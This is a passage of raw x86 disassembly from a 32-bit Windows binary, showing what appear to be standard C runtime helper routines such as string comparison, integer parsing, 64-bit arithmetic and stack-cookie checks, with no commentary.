  426ab3:	mov    BYTE PTR [edi+0x3],al
  426ab6:	mov    al,BYTE PTR [esi+0x2]
  426ab9:	mov    BYTE PTR [edi+0x2],al
  426abc:	mov    eax,DWORD PTR [ebp+0x8]
  426abf:	pop    esi
  426ac0:	pop    edi
  426ac1:	leave  
  426ac2:	ret    
  426ac3:	nop
  426ac4:	mov    al,BYTE PTR [esi+0x3]
  426ac7:	mov    BYTE PTR [edi+0x3],al
  426aca:	mov    al,BYTE PTR [esi+0x2]
  426acd:	mov    BYTE PTR [edi+0x2],al
  426ad0:	mov    al,BYTE PTR [esi+0x1]
  426ad3:	mov    BYTE PTR [edi+0x1],al
  426ad6:	mov    eax,DWORD PTR [ebp+0x8]
  426ad9:	pop    esi
  426ada:	pop    edi
  426adb:	leave  
  426adc:	ret    
  426add:	push   ebp
  426ade:	mov    ebp,esp
  426ae0:	sub    esp,0xc
  426ae3:	mov    eax,ds:0x45c430
  426ae8:	xor    eax,DWORD PTR [ebp+0x4]
  426aeb:	and    BYTE PTR [ebp-0x6],0x0
  426aef:	push   0x6
  426af1:	mov    DWORD PTR [ebp-0x4],eax
  426af4:	lea    eax,[ebp-0xc]
  426af7:	push   eax
  426af8:	push   0x1004
  426afd:	push   DWORD PTR [ebp+0x8]
  426b00:	call   DWORD PTR ds:0x4280dc
  426b06:	test   eax,eax
  426b08:	jne    0x426b0f
  426b0a:	or     eax,0xffffffff
  426b0d:	jmp    0x426b19
  426b0f:	lea    eax,[ebp-0xc]
  426b12:	push   eax
  426b13:	call   0x426e1e
  426b18:	pop    ecx
  426b19:	mov    ecx,DWORD PTR [ebp-0x4]
  426b1c:	xor    ecx,DWORD PTR [ebp+0x4]
  426b1f:	call   0x423f2c
  426b24:	leave  
  426b25:	ret    
  426b26:	push   0x38
  426b28:	push   0x428ea8
  426b2d:	call   0x423858
  426b32:	mov    eax,ds:0x45c430
  426b37:	xor    eax,DWORD PTR [ebp+0x4]
  426b3a:	mov    DWORD PTR [ebp-0x1c],eax
  426b3d:	xor    edi,edi
  426b3f:	mov    DWORD PTR [ebp-0x20],edi
  426b42:	mov    DWORD PTR [ebp-0x24],edi
  426b45:	mov    eax,DWORD PTR [ebp+0x14]
  426b48:	mov    ebx,DWORD PTR [eax]
  426b4a:	mov    DWORD PTR [ebp-0x28],ebx
  426b4d:	mov    DWORD PTR [ebp-0x2c],edi
  426b50:	mov    eax,DWORD PTR [ebp+0x8]
  426b53:	cmp    eax,DWORD PTR [ebp+0xc]
  426b56:	je     0x426ccf
  426b5c:	lea    ecx,[ebp-0x40]
  426b5f:	push   ecx
  426b60:	push   eax
  426b61:	mov    esi,DWORD PTR ds:0x4280a0
  426b67:	call   esi
  426b69:	test   eax,eax
  426b6b:	je     0x426b8d
  426b6d:	cmp    DWORD PTR [ebp-0x40],0x1
  426b71:	jne    0x426b8d
  426b73:	lea    eax,[ebp-0x40]
  426b76:	push   eax
  426b77:	push   DWORD PTR [ebp+0xc]
  426b7a:	call   esi
  426b7c:	test   eax,eax
  426b7e:	je     0x426b8d
  426b80:	cmp    DWORD PTR [ebp-0x40],0x1
  426b84:	jne    0x426b8d
  426b86:	mov    DWORD PTR [ebp-0x2c],0x1
  426b8d:	cmp    DWORD PTR [ebp-0x2c],edi
  426b90:	je     0x426bac
  426b92:	cmp    ebx,0xffffffff
  426b95:	je     0x426b9b
  426b97:	mov    esi,ebx
  426b99:	jmp    0x426ba7
  426b9b:	push   DWORD PTR [ebp+0x10]
  426b9e:	call   0x423e70
  426ba3:	pop    ecx
  426ba4:	mov    esi,eax
  426ba6:	inc    esi
  426ba7:	mov    DWORD PTR [ebp-0x44],esi
  426baa:	jmp    0x426baf
  426bac:	mov    esi,DWORD PTR [ebp-0x44]
  426baf:	cmp    DWORD PTR [ebp-0x2c],edi
  426bb2:	jne    0x426bce
  426bb4:	push   edi
  426bb5:	push   edi
  426bb6:	push   ebx
  426bb7:	push   DWORD PTR [ebp+0x10]
  426bba:	push   0x1
  426bbc:	push   DWORD PTR [ebp+0x8]
  426bbf:	call   DWORD PTR ds:0x4280cc
  426bc5:	mov    esi,eax
  426bc7:	mov    DWORD PTR [ebp-0x44],esi
  426bca:	cmp    esi,edi
  426bcc:	je     0x426c26
  426bce:	mov    DWORD PTR [ebp-0x4],edi
  426bd1:	lea    eax,[esi+esi*1]
  426bd4:	add    eax,0x3
  426bd7:	and    eax,0xfffffffc
  426bda:	call   0x4238b0
  426bdf:	mov    DWORD PTR [ebp-0x18],esp
  426be2:	mov    ebx,esp
  426be4:	mov    DWORD PTR [ebp-0x48],ebx
  426be7:	lea    eax,[esi+esi*1]
  426bea:	push   eax
  426beb:	push   edi
  426bec:	push   ebx
  426bed:	call   0x426160
  426bf2:	add    esp,0xc
  426bf5:	or     DWORD PTR [ebp-0x4],0xffffffff
  426bf9:	jmp    0x426c12
  426bfb:	xor    eax,eax
  426bfd:	inc    eax
  426bfe:	ret    
  426bff:	mov    esp,DWORD PTR [ebp-0x18]
  426c02:	call   0x426cf5
  426c07:	xor    edi,edi
  426c09:	xor    ebx,ebx
  426c0b:	or     DWORD PTR [ebp-0x4],0xffffffff
  426c0f:	mov    esi,DWORD PTR [ebp-0x44]
  426c12:	cmp    ebx,edi
  426c14:	jne    0x426c34
  426c16:	push   esi
  426c17:	push   0x2
  426c19:	call   0x424978
  426c1e:	pop    ecx
  426c1f:	pop    ecx
  426c20:	mov    ebx,eax
  426c22:	cmp    ebx,edi
  426c24:	jne    0x426c2d
  426c26:	xor    eax,eax
  426c28:	jmp    0x426ce1
  426c2d:	mov    DWORD PTR [ebp-0x24],0x1
  426c34:	push   esi
  426c35:	push   ebx
  426c36:	push   DWORD PTR [ebp-0x28]
  426c39:	push   DWORD PTR [ebp+0x10]
  426c3c:	push   0x1
  426c3e:	push   DWORD PTR [ebp+0x8]
  426c41:	call   DWORD PTR ds:0x4280cc
  426c47:	test   eax,eax
  426c49:	je     0x426cd2
  426c4f:	cmp    DWORD PTR [ebp+0x18],edi
  426c52:	je     0x426c74
  426c54:	push   edi
  426c55:	push   edi
  426c56:	push   DWORD PTR [ebp+0x1c]
  426c59:	push   DWORD PTR [ebp+0x18]
  426c5c:	push   esi
  426c5d:	push   ebx
  426c5e:	push   edi
  426c5f:	push   DWORD PTR [ebp+0xc]
  426c62:	call   DWORD PTR ds:0x428050
  426c68:	test   eax,eax
  426c6a:	je     0x426cd2
  426c6c:	mov    eax,DWORD PTR [ebp+0x18]
  426c6f:	mov    DWORD PTR [ebp-0x20],eax
  426c72:	jmp    0x426cd2
  426c74:	cmp    DWORD PTR [ebp-0x2c],edi
  426c77:	jne    0x426c8f
  426c79:	push   edi
  426c7a:	push   edi
  426c7b:	push   edi
  426c7c:	push   edi
  426c7d:	push   esi
  426c7e:	push   ebx
  426c7f:	push   edi
  426c80:	push   DWORD PTR [ebp+0xc]
  426c83:	call   DWORD PTR ds:0x428050
  426c89:	mov    esi,eax
  426c8b:	cmp    esi,edi
  426c8d:	je     0x426cd2
  426c8f:	push   esi
  426c90:	push   0x1
  426c92:	call   0x424978
  426c97:	pop    ecx
  426c98:	pop    ecx
  426c99:	mov    DWORD PTR [ebp-0x20],eax
  426c9c:	cmp    eax,edi
  426c9e:	je     0x426cd2
  426ca0:	push   edi
  426ca1:	push   edi
  426ca2:	push   esi
  426ca3:	push   eax
  426ca4:	push   esi
  426ca5:	push   ebx
  426ca6:	push   edi
  426ca7:	push   DWORD PTR [ebp+0xc]
  426caa:	call   DWORD PTR ds:0x428050
  426cb0:	cmp    eax,edi
  426cb2:	jne    0x426cc2
  426cb4:	push   DWORD PTR [ebp-0x20]
  426cb7:	call   0x42446a
  426cbc:	pop    ecx
  426cbd:	mov    DWORD PTR [ebp-0x20],edi
  426cc0:	jmp    0x426cd2
  426cc2:	cmp    DWORD PTR [ebp-0x28],0xffffffff
  426cc6:	je     0x426cd2
  426cc8:	mov    ecx,DWORD PTR [ebp+0x14]
  426ccb:	mov    DWORD PTR [ecx],eax
  426ccd:	jmp    0x426cd2
  426ccf:	mov    ebx,DWORD PTR [ebp-0x48]
  426cd2:	cmp    DWORD PTR [ebp-0x24],edi
  426cd5:	je     0x426cde
  426cd7:	push   ebx
  426cd8:	call   0x42446a
  426cdd:	pop    ecx
  426cde:	mov    eax,DWORD PTR [ebp-0x20]
  426ce1:	lea    esp,[ebp-0x54]
  426ce4:	mov    ecx,DWORD PTR [ebp-0x1c]
  426ce7:	xor    ecx,DWORD PTR [ebp+0x4]
  426cea:	call   0x423f2c
  426cef:	call   0x423893
  426cf4:	ret    
  426cf5:	push   ebp
  426cf6:	mov    ebp,esp
  426cf8:	sub    esp,0x48
  426cfb:	push   ebx
  426cfc:	push   esi
  426cfd:	push   edi
  426cfe:	push   0x4
  426d00:	pop    eax
  426d01:	call   0x4238b0
  426d06:	mov    ebx,esp
  426d08:	push   0x1c
  426d0a:	lea    eax,[ebp-0x24]
  426d0d:	push   eax
  426d0e:	push   ebx
  426d0f:	call   DWORD PTR ds:0x4280e8
  426d15:	test   eax,eax
  426d17:	je     0x426d8a
  426d19:	mov    edi,DWORD PTR [ebp-0x20]
  426d1c:	lea    eax,[ebp-0x48]
  426d1f:	push   eax
  426d20:	call   DWORD PTR ds:0x4280e4
  426d26:	mov    eax,DWORD PTR [ebp-0x44]
  426d29:	lea    esi,[eax-0x1]
  426d2c:	not    esi
  426d2e:	and    esi,ebx
  426d30:	sub    esi,eax
  426d32:	mov    DWORD PTR [ebp-0x4],eax
  426d35:	mov    eax,ds:0x45cac4
  426d3a:	mov    ecx,eax
  426d3c:	dec    ecx
  426d3d:	neg    ecx
  426d3f:	sbb    ecx,ecx
  426d41:	and    ecx,0xffff1000
  426d47:	add    ecx,0x11000
  426d4d:	add    ecx,edi
  426d4f:	cmp    esi,ecx
  426d51:	jb     0x426d8a
  426d53:	cmp    eax,0x1
  426d56:	je     0x426da2
  426d58:	mov    ebx,edi
  426d5a:	mov    edi,0x1000
  426d5f:	push   0x1c
  426d61:	lea    eax,[ebp-0x24]
  426d64:	push   eax
  426d65:	push   ebx
  426d66:	call   DWORD PTR ds:0x4280e8
  426d6c:	test   eax,eax
  426d6e:	je     0x426d8a
  426d70:	add    ebx,DWORD PTR [ebp-0x18]
  426d73:	test   DWORD PTR [ebp-0x14],edi
  426d76:	je     0x426d5f
  426d78:	test   BYTE PTR [ebp-0xf],0x1
  426d7c:	mov    ebx,DWORD PTR [ebp-0x24]
  426d7f:	je     0x426d86
  426d81:	xor    eax,eax
  426d83:	inc    eax
  426d84:	jmp    0x426dbe
  426d86:	cmp    esi,ebx
  426d88:	jae    0x426d8e
  426d8a:	xor    eax,eax
  426d8c:	jmp    0x426dbe
  426d8e:	push   0x4
  426d90:	push   edi
  426d91:	push   DWORD PTR [ebp-0x4]
  426d94:	push   ebx
  426d95:	call   DWORD PTR ds:0x4280ac
  426d9b:	mov    eax,ds:0x45cac4
  426da0:	jmp    0x426da4
  426da2:	mov    ebx,esi
  426da4:	dec    eax
  426da5:	neg    eax
  426da7:	sbb    eax,eax
  426da9:	and    eax,0x103
  426dae:	lea    ecx,[ebp-0x8]
  426db1:	push   ecx
  426db2:	inc    eax
  426db3:	push   eax
  426db4:	push   DWORD PTR [ebp-0x4]
  426db7:	push   ebx
  426db8:	call   DWORD PTR ds:0x428008
  426dbe:	lea    esp,[ebp-0x54]
  426dc1:	pop    edi
  426dc2:	pop    esi
  426dc3:	pop    ebx
  426dc4:	leave  
  426dc5:	ret    
  426dc6:	int3   
  426dc7:	int3   
  426dc8:	int3   
  426dc9:	int3   
  426dca:	int3   
  426dcb:	int3   
  426dcc:	int3   
  426dcd:	int3   
  426dce:	int3   
  426dcf:	int3   
  426dd0:	push   ebp
  426dd1:	mov    ebp,esp
  426dd3:	push   edi
  426dd4:	push   esi
  426dd5:	push   ebx
  426dd6:	mov    esi,DWORD PTR [ebp+0xc]
  426dd9:	mov    edi,DWORD PTR [ebp+0x8]
  426ddc:	mov    al,0xff
  426dde:	mov    edi,edi
  426de0:	or     al,al
  426de2:	je     0x426e16
  426de4:	mov    al,BYTE PTR [esi]
  426de6:	add    esi,0x1
  426de9:	mov    ah,BYTE PTR [edi]
  426deb:	add    edi,0x1
  426dee:	cmp    ah,al
  426df0:	je     0x426de0
  426df2:	sub    al,0x41
  426df4:	cmp    al,0x1a
  426df6:	sbb    cl,cl
  426df8:	and    cl,0x20
  426dfb:	add    al,cl
  426dfd:	add    al,0x41
  426dff:	xchg   al,ah
  426e01:	sub    al,0x41
  426e03:	cmp    al,0x1a
  426e05:	sbb    cl,cl
  426e07:	and    cl,0x20
  426e0a:	add    al,cl
  426e0c:	add    al,0x41
  426e0e:	cmp    al,ah
  426e10:	je     0x426de0
  426e12:	sbb    al,al
  426e14:	sbb    al,0xff
  426e16:	movsx  eax,al
  426e19:	pop    ebx
  426e1a:	pop    esi
  426e1b:	pop    edi
  426e1c:	leave  
  426e1d:	ret    
  426e1e:	push   esi
  426e1f:	push   edi
  426e20:	call   0x42370d
  426e25:	mov    edi,DWORD PTR [eax+0x64]
  426e28:	cmp    edi,DWORD PTR ds:0x45c58c
  426e2e:	je     0x426e37
  426e30:	call   0x424bbf
  426e35:	mov    edi,eax
  426e37:	mov    esi,DWORD PTR [esp+0xc]
  426e3b:	cmp    DWORD PTR [edi+0x28],0x1
  426e3f:	movzx  eax,BYTE PTR [esi]
  426e42:	jle    0x426e52
  426e44:	push   0x8
  426e46:	push   eax
  426e47:	push   edi
  426e48:	call   0x426ea6
  426e4d:	add    esp,0xc
  426e50:	jmp    0x426e5c
  426e52:	mov    ecx,DWORD PTR [edi+0x48]
  426e55:	movzx  eax,BYTE PTR [ecx+eax*2]
  426e59:	and    eax,0x8
  426e5c:	test   eax,eax
  426e5e:	je     0x426e63
  426e60:	inc    esi
  426e61:	jmp    0x426e3b
  426e63:	movzx  ecx,BYTE PTR [esi]
  426e66:	inc    esi
  426e67:	cmp    ecx,0x2d
  426e6a:	mov    edx,ecx
  426e6c:	je     0x426e73
  426e6e:	cmp    ecx,0x2b
  426e71:	jne    0x426e77
  426e73:	movzx  ecx,BYTE PTR [esi]
  426e76:	inc    esi
  426e77:	xor    eax,eax
  426e79:	cmp    ecx,0x30
  426e7c:	jl     0x426e88
  426e7e:	cmp    ecx,0x39
  426e81:	jg     0x426e88
  426e83:	sub    ecx,0x30
  426e86:	jmp    0x426e8b
  426e88:	or     ecx,0xffffffff
  426e8b:	cmp    ecx,0xffffffff
  426e8e:	je     0x426e9c
  426e90:	lea    eax,[eax+eax*4]
  426e93:	lea    eax,[ecx+eax*2]
  426e96:	movzx  ecx,BYTE PTR [esi]
  426e99:	inc    esi
  426e9a:	jmp    0x426e79
  426e9c:	cmp    edx,0x2d
  426e9f:	pop    edi
  426ea0:	pop    esi
  426ea1:	jne    0x426ea5
  426ea3:	neg    eax
  426ea5:	ret    
  426ea6:	push   ebp
  426ea7:	mov    ebp,esp
  426ea9:	push   ecx
  426eaa:	mov    eax,DWORD PTR [ebp+0xc]
  426ead:	lea    ecx,[eax+0x1]
  426eb0:	cmp    ecx,0x100
  426eb6:	mov    ecx,DWORD PTR [ebp+0x8]
  426eb9:	ja     0x426ec4
  426ebb:	mov    ecx,DWORD PTR [ecx+0x48]
  426ebe:	movzx  eax,WORD PTR [ecx+eax*2]
  426ec2:	jmp    0x426f18
  426ec4:	push   esi
  426ec5:	mov    edx,eax
  426ec7:	sar    edx,0x8
  426eca:	push   edi
  426ecb:	mov    edi,DWORD PTR [ecx+0x48]
  426ece:	movzx  esi,dl
  426ed1:	test   BYTE PTR [edi+esi*2+0x1],0x80
  426ed6:	pop    edi
  426ed7:	pop    esi
  426ed8:	je     0x426ee9
  426eda:	and    BYTE PTR [ebp-0x2],0x0
  426ede:	push   0x2
  426ee0:	mov    BYTE PTR [ebp-0x3],al
  426ee3:	mov    BYTE PTR [ebp-0x4],dl
  426ee6:	pop    eax
  426ee7:	jmp    0x426ef3
  426ee9:	and    BYTE PTR [ebp-0x3],0x0
  426eed:	mov    BYTE PTR [ebp-0x4],al
  426ef0:	xor    eax,eax
  426ef2:	inc    eax
  426ef3:	push   0x1
  426ef5:	push   DWORD PTR [ecx+0x14]
  426ef8:	push   DWORD PTR [ecx+0x4]
  426efb:	lea    ecx,[ebp+0xe]
  426efe:	push   ecx
  426eff:	push   eax
  426f00:	lea    eax,[ebp-0x4]
  426f03:	push   eax
  426f04:	push   0x1
  426f06:	call   0x425f88
  426f0b:	add    esp,0x1c
  426f0e:	test   eax,eax
  426f10:	jne    0x426f14
  426f12:	leave  
  426f13:	ret    
  426f14:	movzx  eax,WORD PTR [ebp+0xe]
  426f18:	and    eax,DWORD PTR [ebp+0x10]
  426f1b:	leave  
  426f1c:	ret    
  426f1d:	int3   
  426f1e:	int3   
  426f1f:	int3   
  426f20:	mov    eax,DWORD PTR [esp+0x8]
  426f24:	mov    ecx,DWORD PTR [esp+0x10]
  426f28:	or     ecx,eax
  426f2a:	mov    ecx,DWORD PTR [esp+0xc]
  426f2e:	jne    0x426f39
  426f30:	mov    eax,DWORD PTR [esp+0x4]
  426f34:	mul    ecx
  426f36:	ret    0x10
  426f39:	push   ebx
  426f3a:	mul    ecx
  426f3c:	mov    ebx,eax
  426f3e:	mov    eax,DWORD PTR [esp+0x8]
  426f42:	mul    DWORD PTR [esp+0x14]
  426f46:	add    ebx,eax
  426f48:	mov    eax,DWORD PTR [esp+0x8]
  426f4c:	mul    ecx
  426f4e:	add    edx,ebx
  426f50:	pop    ebx
  426f51:	ret    0x10
  426f54:	int3   
  426f55:	int3   
  426f56:	int3   
  426f57:	int3   
  426f58:	int3   
  426f59:	int3   
  426f5a:	int3   
  426f5b:	int3   
  426f5c:	int3   
  426f5d:	int3   
  426f5e:	int3   
  426f5f:	int3   
  426f60:	push   ebp
  426f61:	mov    ebp,esp
  426f63:	push   edi
  426f64:	push   esi
  426f65:	push   ebx
  426f66:	mov    ecx,DWORD PTR [ebp+0x10]
  426f69:	or     ecx,ecx
  426f6b:	je     0x426fba
  426f6d:	mov    esi,DWORD PTR [ebp+0x8]
  426f70:	mov    edi,DWORD PTR [ebp+0xc]
  426f73:	mov    bh,0x41
  426f75:	mov    bl,0x5a
  426f77:	mov    dh,0x20
  426f79:	lea    ecx,[ecx+0x0]
  426f7c:	mov    ah,BYTE PTR [esi]
  426f7e:	or     ah,ah
  426f80:	mov    al,BYTE PTR [edi]
  426f82:	je     0x426fab
  426f84:	or     al,al
  426f86:	je     0x426fab
  426f88:	add    esi,0x1
  426f8b:	add    edi,0x1
  426f8e:	cmp    ah,bh
  426f90:	jb     0x426f98
  426f92:	cmp    ah,bl
  426f94:	ja     0x426f98
  426f96:	add    ah,dh
  426f98:	cmp    al,bh
  426f9a:	jb     0x426fa2
  426f9c:	cmp    al,bl
  426f9e:	ja     0x426fa2
  426fa0:	add    al,dh
  426fa2:	cmp    ah,al
  426fa4:	jne    0x426fb1
  426fa6:	sub    ecx,0x1
  426fa9:	jne    0x426f7c
  426fab:	xor    ecx,ecx
  426fad:	cmp    ah,al
  426faf:	je     0x426fba
  426fb1:	mov    ecx,0xffffffff
  426fb6:	jb     0x426fba
  426fb8:	neg    ecx
  426fba:	mov    eax,ecx
  426fbc:	pop    ebx
  426fbd:	pop    esi
  426fbe:	pop    edi
  426fbf:	leave  
  426fc0:	ret    
  426fc1:	int3   
  426fc2:	int3   
  426fc3:	int3   
  426fc4:	int3   
  426fc5:	int3   
  426fc6:	int3   
  426fc7:	int3   
  426fc8:	int3   
  426fc9:	int3   
  426fca:	int3   
  426fcb:	int3   
  426fcc:	int3   
  426fcd:	int3   
  426fce:	int3   
  426fcf:	int3   
  426fd0:	push   esi
  426fd1:	mov    eax,DWORD PTR [esp+0x14]
  426fd5:	or     eax,eax
  426fd7:	jne    0x427001
  426fd9:	mov    ecx,DWORD PTR [esp+0x10]
  426fdd:	mov    eax,DWORD PTR [esp+0xc]
  426fe1:	xor    edx,edx
  426fe3:	div    ecx
  426fe5:	mov    ebx,eax
  426fe7:	mov    eax,DWORD PTR [esp+0x8]
  426feb:	div    ecx
  426fed:	mov    esi,eax
  426fef:	mov    eax,ebx
  426ff1:	mul    DWORD PTR [esp+0x10]
  426ff5:	mov    ecx,eax
  426ff7:	mov    eax,esi
  426ff9:	mul    DWORD PTR [esp+0x10]
  426ffd:	add    edx,ecx
  426fff:	jmp    0x427048
  427001:	mov    ecx,eax
  427003:	mov    ebx,DWORD PTR [esp+0x10]
  427007:	mov    edx,DWORD PTR [esp+0xc]
  42700b:	mov    eax,DWORD PTR [esp+0x8]
  42700f:	shr    ecx,1
  427011:	rcr    ebx,1
  427013:	shr    edx,1
  427015:	rcr    eax,1
  427017:	or     ecx,ecx
  427019:	jne    0x42700f
  42701b:	div    ebx
  42701d:	mov    esi,eax
  42701f:	mul    DWORD PTR [esp+0x14]
  427023:	mov    ecx,eax
  427025:	mov    eax,DWORD PTR [esp+0x10]
  427029:	mul    esi
  42702b:	add    edx,ecx
  42702d:	jb     0x42703d
  42702f:	cmp    edx,DWORD PTR [esp+0xc]
  427033:	ja     0x42703d
  427035:	jb     0x427046
  427037:	cmp    eax,DWORD PTR [esp+0x8]
  42703b:	jbe    0x427046
  42703d:	dec    esi
  42703e:	sub    eax,DWORD PTR [esp+0x10]
  427042:	sbb    edx,DWORD PTR [esp+0x14]
  427046:	xor    ebx,ebx
  427048:	sub    eax,DWORD PTR [esp+0x8]
  42704c:	sbb    edx,DWORD PTR [esp+0xc]
  427050:	neg    edx
  427052:	neg    eax
  427054:	sbb    edx,0x0
  427057:	mov    ecx,edx
  427059:	mov    edx,ebx
  42705b:	mov    ebx,ecx
  42705d:	mov    ecx,eax
  42705f:	mov    eax,esi
  427061:	pop    esi
  427062:	ret    0x10
  427065:	int3   
  427066:	int3   
  427067:	int3   
  427068:	int3   
  427069:	int3   
  42706a:	int3   
  42706b:	int3   
  42706c:	int3   
  42706d:	int3   
  42706e:	int3   
  42706f:	int3   
  427070:	lea    eax,[edx-0x1]
  427073:	pop    ebx
  427074:	ret    
  427075:	lea    esp,[esp+0x0]
  42707c:	lea    esp,[esp+0x0]
  427080:	xor    eax,eax
  427082:	mov    al,BYTE PTR [esp+0x8]
  427086:	push   ebx
  427087:	mov    ebx,eax
  427089:	shl    eax,0x8
  42708c:	mov    edx,DWORD PTR [esp+0x8]
  427090:	test   edx,0x3
  427096:	je     0x4270ad
  427098:	mov    cl,BYTE PTR [edx]
  42709a:	add    edx,0x1
  42709d:	cmp    cl,bl
  42709f:	je     0x427070
  4270a1:	test   cl,cl
  4270a3:	je     0x4270f6
  4270a5:	test   edx,0x3
  4270ab:	jne    0x427098
  4270ad:	or     ebx,eax
  4270af:	push   edi
  4270b0:	mov    eax,ebx
  4270b2:	shl    ebx,0x10
  4270b5:	push   esi
  4270b6:	or     ebx,eax
  4270b8:	mov    ecx,DWORD PTR [edx]
  4270ba:	mov    edi,0x7efefeff
  4270bf:	mov    eax,ecx
  4270c1:	mov    esi,edi
  4270c3:	xor    ecx,ebx
  4270c5:	add    esi,eax
  4270c7:	add    edi,ecx
  4270c9:	xor    ecx,0xffffffff
  4270cc:	xor    eax,0xffffffff
  4270cf:	xor    ecx,edi
  4270d1:	xor    eax,esi
  4270d3:	add    edx,0x4
  4270d6:	and    ecx,0x81010100
  4270dc:	jne    0x4270fa
  4270de:	and    eax,0x81010100
  4270e3:	je     0x4270b8
  4270e5:	and    eax,0x1010100
  4270ea:	jne    0x4270f4
  4270ec:	and    esi,0x80000000
  4270f2:	jne    0x4270b8
  4270f4:	pop    esi
  4270f5:	pop    edi
  4270f6:	pop    ebx
  4270f7:	xor    eax,eax
  4270f9:	ret    
  4270fa:	mov    eax,DWORD PTR [edx-0x4]
  4270fd:	cmp    al,bl
  4270ff:	je     0x427137
  427101:	test   al,al
  427103:	je     0x4270f4
  427105:	cmp    ah,bl
  427107:	je     0x427130
  427109:	test   ah,ah
  42710b:	je     0x4270f4
  42710d:	shr    eax,0x10
  427110:	cmp    al,bl
  427112:	je     0x427129
  427114:	test   al,al
  427116:	je     0x4270f4
  427118:	cmp    ah,bl
  42711a:	je     0x427122
  42711c:	test   ah,ah
  42711e:	je     0x4270f4
  427120:	jmp    0x4270b8
  427122:	pop    esi
  427123:	pop    edi
  427124:	lea    eax,[edx-0x1]
  427127:	pop    ebx
  427128:	ret    
  427129:	lea    eax,[edx-0x2]
  42712c:	pop    esi
  42712d:	pop    edi
  42712e:	pop    ebx
  42712f:	ret    
  427130:	lea    eax,[edx-0x3]
  427133:	pop    esi
  427134:	pop    edi
  427135:	pop    ebx
  427136:	ret    
  427137:	lea    eax,[edx-0x4]
  42713a:	pop    esi
  42713b:	pop    edi
  42713c:	pop    ebx
  42713d:	ret    
  42713e:	jmp    DWORD PTR ds:0x4280e0
